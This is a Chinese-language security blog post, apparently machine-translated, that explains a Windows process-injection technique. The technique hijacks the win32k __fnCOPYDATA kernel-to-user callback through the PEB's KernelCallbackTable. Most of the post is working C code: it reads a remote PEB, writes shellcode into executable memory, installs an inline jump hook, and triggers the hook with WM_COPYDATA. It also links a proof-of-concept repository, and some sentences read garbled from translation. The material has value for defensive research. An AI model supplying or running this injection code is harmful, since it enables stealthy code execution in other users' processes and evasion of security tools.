---
title: Win32k回调绕道：滥用合法的内核到用户回调分发进行代码执行
url: https://mp.weixin.qq.com/s/XtR710ZEj7TYzuEyr3y91w
source: Doonsec's feed
date: 2026-07-03
fetch_date: 2026-07-04T05:45:30.876849
---

# Win32k回调绕道：滥用合法的内核到用户回调分发进行代码执行

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FInozjUelL9L9icPQ9x7Qw8CDGUnaeibhAwgwhoy9sibuyqIu8KlplSb6xogNrmHNgM9eMjF5OsJXWyXb0aEhzXiczwjqJV7k8PQg/0?wx_fmt=jpeg)

# Win32k回调绕道：滥用合法的内核到用户回调分发进行代码执行

Ots安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

概述

这种注入技术滥用了 Windows 图形子系统使用的内核到用户回调分发路径，win32k.sys从而在远程进程中执行代码。通过定位进程环境块 (PEB)，攻击者可以枚举回调条目，并识别在 GUI 相关内核转换期间调用的合法用户模式例程。KernelCallbackTablethrough the target process’s

与传统的内核回调表注入（直接用 shellcode 地址覆盖回调条目）不同，这种变体会劫持表中引用的合法回调目标，并在调用时将执行重定向到攻击者控制的 shellcode。由于执行是通过现有且预期的回调路径劫持的，因此该技术可以提供一种比远程线程创建或基于 APC 的注入等更隐蔽的替代方案。

理解机制

Windows 回调调度流程

Windows 图形子系统通过内核模式发起的回调机制，将部分与 GUI 相关的处理委托给用户模式。当win32k.sys需要在 GUI 进程的上下文中执行逻辑时，它会调用回调机制KeUserModeCallback来执行从内核模式到用户模式的受控转换，同时保持两个执行上下文之间的隔离边界。

这种转变建立了内核将图形子系统回调分派到用户模式的合法执行路径——而这条路径后来被本文提出的技术滥用。

KiUserCallbackDispatcher

转换完成后，执行进入 ` callback\_index` 例程KiUserCallbackDispatcher，该ntdll.dll例程负责接收内核提供的回调索引，并将执行分派给相应的用户模式回调处理程序。该例程是所有通过 `callback\_index` 发起的回调的强制入口点KeUserModeCallback。

因为所有回调解析都汇聚到这个调度器，KiUserCallbackDispatcher所以它充当内核回调请求与其最终用户模式执行之间的中心枢纽。

内核回调表解析路径

要解析请求的回调的目标，KiUserCallbackDispatcher需要查询KernelCallbackTable目标进程的PEB中存储的表项。每个表项都包含一个指向与特定图形子系统操作关联的用户模式回调例程的指针，该例程通常在user32.dll.

传统的内核回调表注入技术直接覆盖一个或多个回调表条目以重定向执行。虽然这种方法有效，但修改表本身会引入结构异常，而这些异常可以通过对PEB或回调表内容进行完整性验证轻松检测到。本文提出的技术通过保留表结构并绕过条目引用的回调目标来避免这种情况。

利用 \_\_fnCOPYDATA 作为执行原语

在可用的KernelCallbackTable条目中，它提供了一个特别方便的触发原语，因为它可以通过SendMessage()\_\_fnCOPYDATA发送WM\_COPYDATA消息从外部调用。这使得回调能够确定性地触发，而无需特殊的进程状态或复杂的交互。

通过利用自然可访问且常用的回调目标，该技术获得了可靠的执行原语，同时在重定向之前完全保持在预期的回调分发链内。

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0H6g6DusnjOctibWoicyeOwyR1mLKxLE325smib4cvbppib2AofwoYCQoZMp8VqeK3lcWotStEOUc7kBuaxPBOZIbRK6B8gf2TsPVw/640?wx_fmt=png&from=appmsg)

工作原理

该技术首先定位目标进程并读取其执行文件块 (PEB)KernelCallbackTable以获取回调指针的地址\_\_fnCOPYDATA。然后，在远程进程中分配可执行内存，并将攻击者控制的 shellcode 写入该分配区域。在修改之前，合法回调例程的原始字节会被保留，以便后续恢复。

随后，在解析后的例程开头安装一个内联钩子\_\_fnCOPYDATA，将其序言替换为直接跳转到注入的 shellcode。为了触发执行，会向目标窗口发送WM\_COPYDATA消息，导致 Windows 图形子系统通过标准的内核到用户的回调链进行分发\_\_fnCOPYDATA。执行完成后，会恢复原始回调字节，以保持进程稳定性并减少残留的修改痕迹。

执行

步骤 1：获取远程进程 PEB 和内核回调表

它位于PEB内的偏移量0x58KernelCallbackTable处：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0G3GBBg5EIjMdBcSxUKHu938aL47azo8ibYLLTrSpCT5aJACcEYA1F8QQPc1vicOk1teo75jw9WjhPHNNqObiaibf0iauBN1Ef93huI/640?wx_fmt=png&from=appmsg)

使用以下逻辑可以获得它：

```
PROCESS_BASIC_INFORMATION pbi;
PEB peb;
KERNELCALLBACKTABLE kct;

if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != STATUS_SUCCESS)
{
    NtClose(hProcess);
    return1;
}

/* Read remote PEB */
if (NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL) != STATUS_SUCCESS)
{
    NtClose(hProcess);
    return1;
}

/* Ensure KernelCallbackTable is present */
if (!peb.KernelCallbackTable) {
    NtClose(hProcess);
    return1;
}

/* Read KernelCallbackTable contents */
if (NtReadVirtualMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL) != STATUS_SUCCESS)
{
    NtClose(hProcess);
    return1;
}
```

代码首先调用NtQueryInformationProcess信息ProcessBasicInformation类来填充结构，该结构通过字段PROCESS\_BASIC\_INFORMATION公开远程进程的PEBPebBaseAddress地址。

接下来，NtReadVirtualMemory该函数用于将远程PEB读取到本地PEB结构中，从而提取存储在进程环境中的KernelCallbackTable指针。验证回调表存在后，第二个NtReadVirtualMemory调用会将远程KERNELCALLBACKTABLE结构复制到本地内存中，以便直接解析回调目标，例如\_\_fnCOPYDATA用于后续的绕行操作。

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0GKC3T05PeA8oEic7LOiaomwHFGL3ibJPn1utiaMogHxCMvVIzwBrtoD0hGMmfLwG4AzX8IwDLzCvqsOcmx4jMFpVNwTZWGSKFCQFo/640?wx_fmt=png&from=appmsg)

步骤 2：在远程进程中分配 Shellcode

```
PVOID remoteShellcodeAddr = NULL;
    SIZE_T shellcodeSize = sizeof(g_CalcSh);

    if (NtAllocateVirtualMemory(hProcess, &remoteShellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == STATUS_SUCCESS) {
        if (NtWriteVirtualMemory(hProcess, remoteShellcodeAddr, g_CalcSh, sizeof(g_CalcSh), NULL) == STATUS_SUCCESS) {

            printf("[+] shellcode @ 0x%p\n", remoteShellcodeAddr);
```

NtAllocateVirtualMemory在远程进程内部预留可执行内存，并通过返回其基地址remoteShellcodeAddr。分配的大小取决于 shellcode 缓冲区长度。

NtWriteVirtualMemory然后将 shellcode 复制到分配的区域中，将有效载荷暂存在目标进程中，以便稍后通过回调绕道执行。

步骤 3：安装内联钩子和触发执行

```
int InitializeHookRemote(HANDLE hProcess, PVOID pRemoteFunc, PVOID pRemoteDetour, PINLINEHOOKTABLE Hook) {

    if (!pRemoteFunc || !pRemoteDetour || !Hook || !NtProtectVirtualMemory || !NtReadVirtualMemory) return0;

    Hook->pOriginalFunction = pRemoteFunc;
    Hook->pFunctionDetour = pRemoteDetour;

    if (NtReadVirtualMemory(hProcess, pRemoteFunc, Hook->pObjBytes, JMP_SIZE, NULL) != STATUS_SUCCESS) return0;

    PVOID pBaseAddress = pRemoteFunc;
    SIZE_T sRegionSize = JMP_SIZE;
    if (NtProtectVirtualMemory(hProcess, &pBaseAddress, &sRegionSize, PAGE_EXECUTE_READWRITE, &Hook->dwOldProtection) != STATUS_SUCCESS) return0;

    return1;
}
```

InitializeHookRemote通过将原始函数和绕行地址存储在INLINEHOOKTABLE结构体中，为远程回调目标做好绕行准备。它通过读取目标例程的前几个字节来保留原始回调序言NtReadVirtualMemory，然后将该区域的保护级别更改为，以便可以安全地PAGE\_EXECUTE\_READWRITE对其NtProtectVirtualMemory进行修补。

```
int InstallHookRemote(HANDLE hProcess, PINLINEHOOKTABLE Hook) {
    if (!Hook || !Hook->pOriginalFunction || !NtWriteVirtualMemory) return0;

    BYTE g_Jump[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pRemoteDetour
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    UINT64 uPatch = (UINT64)(Hook->pFunctionDetour);
    RtlCopyMemory(&g_Jump[2], &uPatch, sizeof(uPatch));

    if (NtWriteVirtualMemory(hProcess, Hook->pOriginalFunction, g_Jump, sizeof(g_Jump), NULL) != STATUS_SUCCESS) return0;

    printf("[+] Hook installed in remote process @ 0x%p\n", Hook->pOriginalFunction);
    return1;
}
```

InstallHookRemote构造一个绝对 x64 跳转存根（mov r10, <detour>; jmp r10），将执行重定向到注入的 shellcode。然后，通过覆盖目标回调例程的开头NtWriteVirtualMemory，有效地安装内联钩子。

```
int RemoveHookRemote(HANDLE hProcess, PINLINEHOOKTABLE Hook) {
    if (!Hook || !Hook->pOriginalFunction || !NtWriteVirtualMemory || !NtProtectVirtualMemory) return 0;

    ULONG tmpProtection = 0;
    PVOID funcBaseAddr = Hook->pOriginalFunction;
    SIZE_T regionSize = JMP_SIZE;

    NTSTATUS status = NtWriteVirtualMemory(hProcess, Hook->pOriginalFunction, Hook->pObjBytes, JMP_SIZE, NULL);
    NtProtectVirtualMemory(hProcess, &funcBaseAddr, &regionSize, Hook->dwOldProtection, &tmpProtection);

    return (status == STATUS_SUCCESS);
}
```

RemoveHookRemote通过写回存储在结构体中的保留序言字节，恢复原始回调例程INLINEHOOKTABLE。然后，它使用 `remove\_inline\_hook` 恢复已修补区域的原始内存保护属性NtProtectVirtualMemory，移除内联钩子，并将回调目标恢复到初始状态。

```
INLINEHOOKTABLE FnCopyDataHook = { 0 };

if (InitializeHookRemote(hProcess, kct.__fnCOPYDATA, remoteShellcodeAddr, &FnCopyDataHook)) {
    if (InstallHookRemote(hProcess, &FnCopyDataHook)) {

        printf("[>] Triggering WM_COPYDATA callback...\n");

        COPYDATASTRUCT cds = {
            1,
            (DWORD)wcslen(msg) * sizeof(WCHAR),
            msg
        };

        SendMessageW(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);

        RemoveHookRemote(hProcess, &FnCopyDataHook);
    }
}
```

为了触发执行，WM\_COPYDATA会通过某种方式向目标窗口发送一条消息，强制 Windows 回调调度程序通过正常的内核到用户回调路径SendMessageW调用被钩住的例程。执行完成后，会恢复原始回调字节以保持进程稳定性。\_\_fnCOPYDATARemoveHookRemote

执行

逻辑实现完成后，即可执行概念验证，以产生以下结果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0EeGlJR21eZcLMWR5Q3I1NvheOShjib3l8TUYbKjCSAibDibRHFAcOG4r82mU2ymkLf3pjCMtayia6nsMPWicWBv1ibNjmR57ew4dMCo/640?wx_fmt=png&from=appmsg)

项目地址：

https://github.com/n0qword/win32k-callback-detouring

**END**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FXqSyPb7qZOuQ5fxUlic0p6tZVZJPG2vKXav2UPicnd2xOupiby9TcKZ46dmFxSHg0icaWskKA1yuSGfZ8HC7ndnu8ZtUKDUWOGmU/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，...